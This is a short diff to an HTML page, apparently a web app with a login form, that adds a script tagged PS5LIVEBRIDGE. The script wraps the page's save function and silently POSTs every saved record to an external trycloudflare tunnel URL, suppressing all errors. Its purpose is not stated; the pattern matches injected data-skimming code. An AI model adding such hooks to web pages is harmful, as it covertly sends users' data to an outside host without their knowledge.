@@ -670,4 +670,12 @@ var pp=document.getElementById('lgpass');if(pp)pp.addEventListener('keydown',fun
 applyAll();
 })();
 </script>
+
+<script>/*PS5LIVEBRIDGE*/
+(function(){"use strict";
+var LIVE='https://insight-que-webcams-dare.trycloudflare.com/api/state';
+function push(sh,id,p){try{fetch(LIVE,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({sheet:sh,id:id},p))}).catch(function(){});}catch(e){}}
+var n=0,tm=setInterval(function(){if(++n>60){clearInterval(tm);return;}if(typeof window.save==='function'){clearInterval(tm);var o=window.save;window.save=function(sh,id,p){try{o(sh,id,p);}catch(e){}push(sh,id,p);};}},250);
+})();
+</script>
 </body></html>
